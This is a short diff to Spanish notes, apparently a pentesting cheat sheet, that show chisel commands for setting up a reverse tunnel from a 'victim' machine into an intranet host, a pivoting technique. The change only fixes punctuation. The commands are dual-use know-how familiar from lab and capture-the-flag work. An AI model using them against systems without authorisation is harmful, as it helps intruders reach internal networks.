@@ -13,7 +13,7 @@ Maquina local(host):
 
     ./chisel server -p [PUERTO] --reverse
   
-Maquina remota(victim)>
+Maquina remota(victim):
 
     .chisel client [IP_HOST]:[PUERTO_HOST] R:[PUERTO_LOCAL_REDIRECCION]:[IP_VICTIMA_INTRANET]:[PUERTO_INTRANET]
   
